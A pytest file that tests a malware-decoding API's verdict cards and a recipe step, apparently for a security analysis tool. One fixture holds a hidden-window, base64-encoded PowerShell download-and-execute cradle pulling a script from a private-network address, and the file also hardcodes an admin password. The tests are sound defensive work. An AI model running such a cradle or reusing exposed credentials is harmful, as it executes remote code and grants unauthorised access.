"""P0.1 verdict_card + regression tests (chain-recipe wrapper)."""
import os
import re
import requests
import pytest

BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/") or \
           "https://greeting-app-5782.preview.emergentagent.com"

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = "uulVDp5cCSB3Hva99s7UUAwK"

ENCODED_PS = (
    "powershell.exe -NoP -NonI -W Hidden -Enc "
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBl"
    "AG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoA"
    "LwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAHAALgBwAHMAMQAnACkA"
)

VERDICT_KEYS = {
    "label", "verdict", "confidence", "risk_score",
    "reason", "indicators", "recommended_action",
}

EXCEPTION_LEAK_RE = re.compile(
    r"(Traceback|File \"/|/app/backend|Exception:|Error:.+line \d+)"
)


@pytest.fixture(scope="module")
def token():
    r = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
        timeout=15,
    )
    assert r.status_code == 200, f"login failed: {r.status_code} {r.text[:200]}"
    tok = r.json().get("access_token") or r.json().get("token")
    assert tok, f"no token in login response: {r.json()}"
    return tok


@pytest.fixture(scope="module")
def headers(token):
    return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}


def _post_smart(headers, sample):
    return requests.post(
        f"{BASE_URL}/api/decode/smart",
        headers=headers,
        json={"input": sample},
        timeout=60,
    )


def _assert_verdict_shape(vc):
    assert vc is not None, "verdict_card is null"
    assert isinstance(vc, dict), f"verdict_card not a dict: {type(vc)}"
    missing = VERDICT_KEYS - set(vc.keys())
    assert not missing, f"verdict_card missing keys: {missing}"
    assert isinstance(vc.get("indicators"), list), "indicators must be a list"
    reason = vc.get("reason") or ""
    assert not EXCEPTION_LEAK_RE.search(str(reason)), \
        f"exception details leaked in reason: {reason!r}"


# ---------- P0.1: encoded PowerShell malicious sample ----------
def test_verdict_card_malicious_ps(headers):
    r = _post_smart(headers, ENCODED_PS)
    assert r.status_code == 200, r.text[:400]
    body = r.json()
    assert "verdict_card_error" not in body, \
        f"verdict_card_error leaked: {body.get('verdict_card_error')}"
    vc = body.get("verdict_card")
    _assert_verdict_shape(vc)
    label = (vc.get("label") or vc.get("verdict") or "").lower()
    assert label in {"malicious", "suspicious"}, f"expected malicious/suspicious, got {label}"
    # confidence & risk should be non-zero
    assert (vc.get("confidence") or 0) > 0, f"confidence not >0: {vc.get('confidence')}"
    assert (vc.get("risk_score") or 0) > 0, f"risk_score not >0: {vc.get('risk_score')}"
    # positive indicators list should have URL / MITRE / LOLBAS mentions
    inds = vc.get("indicators") or []
    joined = " ".join(
        (i.get("label", "") if isinstance(i, dict) else str(i)) for i in inds
    ).lower()
    # at least one positive-signal keyword
    assert any(k in joined for k in ("url", "mitre", "lolbas", "t105", "powershell", "download")), \
        f"expected URL/MITRE/LOLBAS in indicators, got: {joined[:300]}"


# ---------- P0.1: empty input ----------
def test_verdict_card_empty(headers):
    r = _post_smart(headers, "")
    assert r.status_code in (200, 400, 422), r.status_code
    if r.status_code == 200:
        body = r.json()
        assert "verdict_card_error" not in body
        vc = body.get("verdict_card")
        _assert_verdict_shape(vc)
        label = (vc.get("label") or vc.get("verdict") or "").lower()
        assert label in {"inconclusive", "undecoded", "unknown", "benign"}, label


# ---------- P0.1: plain benign ----------
def test_verdict_card_benign_plain(headers):
    r = _post_smart(headers, "hello world")
    assert r.status_code == 200, r.text[:400]
    body = r.json()
    assert "verdict_card_error" not in body
    vc = body.get("verdict_card")
    _assert_verdict_shape(vc)
    label = (vc.get("label") or vc.get("verdict") or "").lower()
    # must not be malicious for plain benign text
    assert label != "malicious", f"benign text classified malicious: {vc}"


# ---------- Regression: chain recipe wrapper ----------
def test_recipe_run_ps_hex_escape(headers):
    r = requests.post(
        f"{BASE_URL}/api/recipe/run",
        headers=headers,
        json={"input": r"\x49\x45\x58", "steps": [{"op": "ps-hex-escape", "args": {}}]},
        timeout=30,
    )
    assert r.status_code == 200, r.text[:400]
    body = r.json()
    assert body.get("errors") in ([], None), f"errors={body.get('errors')}"
    out = body.get("output") or body.get("result") or ""
    assert "IEX" in str(out), f"expected 'IEX' in output, got {out!r}"
